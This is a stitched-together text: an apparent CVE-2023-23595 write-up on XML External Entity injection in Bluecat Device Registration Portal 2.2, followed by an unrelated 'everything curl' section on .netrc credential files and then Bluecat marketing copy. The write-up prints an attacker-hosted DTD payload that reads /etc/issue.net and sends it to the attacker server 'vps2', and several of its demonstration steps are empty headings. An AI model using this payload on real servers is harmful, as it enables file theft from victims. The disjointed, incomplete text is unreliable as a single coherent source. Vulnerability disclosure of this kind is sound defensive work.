# XXE Vulnerability in Bluecat Device Registration Portal (DRP) CVE-2023-23595

## Summary

Bluecat device registration portal / Bluecat DRP version 2 is vulnerable to information leakage via XML External Entity Injection / XXE.

Tested on version 2.2. Version 2 is no longer supported by the vendor.

I was only able to extract single line files - /etc/issue.net for example. This appears to be a feature of Java 7 and above per [https://web.archive.org/web/20230113185834/https://stackoverflow.com/questions/58395997/xxe-unable-to-retrieve-files-with-multiple-lines](https://web.archive.org/web/20230113185834/https%3A//stackoverflow.com/questions/58395997/xxe-unable-to-retrieve-files-with-multiple-lines)

I was also able to exfiltrate single line files via outbound FTP.

## Demonstration

### Attacker server vps2 hosts x.xml

```
<!ENTITY % data SYSTEM "file:///etc/issue.net">
<!ENTITY % param1 "<!ENTITY extract SYSTEM 'http://vps2/?%data;'>">

```

### POST to victim server re

### Read content of exfiltrated file /etc/issue.net in web log on attacker server vps2

# everything curl

# [.netrc](#netrc)

Unix systems have for a long time offered a way for users to store their user
name and password for remote FTP servers. ftp clients have supported this for
decades and this way allowed users to quickly login to known servers without
manually having to reenter the credentials each time. The `.netrc` file is
typically stored in a user's home directory. (On Windows, curl looks for it
with the name `_netrc`).

This being a widespread and well used concept, curl also supports itâif you ask it to. curl does not, however, limit this feature to FTP, but can get credentials for machines for any protocol with this. See further below for how.

## [The .netrc file format](#the-netrc-file-format)

The .netrc file format is simple: you specify lines with a machine name and follow that with the login and password that are associated with that machine.

Each field is provided as a sequence of letters that ends with a space or
newline. Since 7.84.0, curl also supports quoted strings. They start and end
with double quotes (`"`) and support the escaped special letters `\"`,
(newline), (carriage return), and (TAB). Quoted strings are the only way a
space character can be used in a username or password.

**machine name**

Identifies a remote machine name. curl searches the .netrc file for a machine token that matches the remote machine specified in the URL. Once a match is made, the subsequent .netrc tokens are processed, stopping when the end of file is reached or another machine is encountered.

**default**

This is the same as machine name except that `default` matches any name. There can be only one default token, and it must be after all machine tokens. To provide a default anonymous login for hosts that are not otherwise matched, add a line similar to this in the end:

```
default login anonymous password user@domain

```

**login name**

The username string for the remote machine. You cannot use a space in the
name.

**password string**

Supply a password. If this token is present, curl supplies the specified
string if the remote server requires a password as part of the login
process. Note that if this token is present in the .netrc file you really
**should** make sure the file is not readable by anyone besides the user. You
cannot use a space when you enter the password.

**macdef name**

Define a macro. This is **not supported by curl**. In order for the rest of
the `.netrc` to still work fine, curl properly skips every definition done
with `macdef` that it finds.

An example .netrc for the host example.com with a user named 'daniel', using
the password 'qwerty' would look like:

```
machine example.com
login daniel
password qwerty

```

It can also be written on a single line with the same functionality:

```
machine example.com login daniel password qwerty

```
## [Username matching](#username-matching)

When a URL is provided with a username and .netrc is used, then curl tries to
find the matching password for that machine and login combination.

## [Enable netrc](#enable-netrc)

`-n, --netrc` tells curl to look for and use the .netrc file.

`--netrc-file [file]` is similar to `--netrc`, except that you also provide
the path to the actual file to use. This is useful when you want to provide
the information in another directory or with another filename.

`--netrc-optional` is similar to `--netrc`, but this option makes the .netrc usage optional and not mandatory as the `--netrc` option.

## What is it?

Device Registration Portal (DRP) is a standalone application that audits and tracks all devices trying to connect to the network. Administrators gain more control over which devices employees, contractors, or guests can use to connect to the internal network while eliminating heavy IT involvement in device registration.

### The challenge

Given the rise in demand for BYOD and guest access, network administrators want more user access control of third-party devices. The growing number of devices makes it challenging to keep up with device registration and network security while providing user access across different systems. Without a way to centralize self-service registration, administrators face reduced IT productivity that impacts employees, contractors, and guests. They need a cost-effective solution that is tightly integrated to a single DDI platform.

## **Improve User Experience**

Make it easy for users to access the network

## **Increase IT Productivity**

Manage compounding device growth

## **Accelerate Security Response**

Meet internal security requirements and stop threats

#### Key features

* **Self-service**– A user friendly self-service web portal, with secure access using HTTPS (SSL)
* **Administration**– manage devices with IP Lease Management through IPAM integration
* **User authentication**– restrict or allow access to users through authentication services or optional guest access
* **Device on-boarding & off-boarding**–  Rapidly and securely get devices onto and off of the network without IT involvement
* **Track & contro**l – Easily blacklist mac addresses or users and limit the number of devices on the network
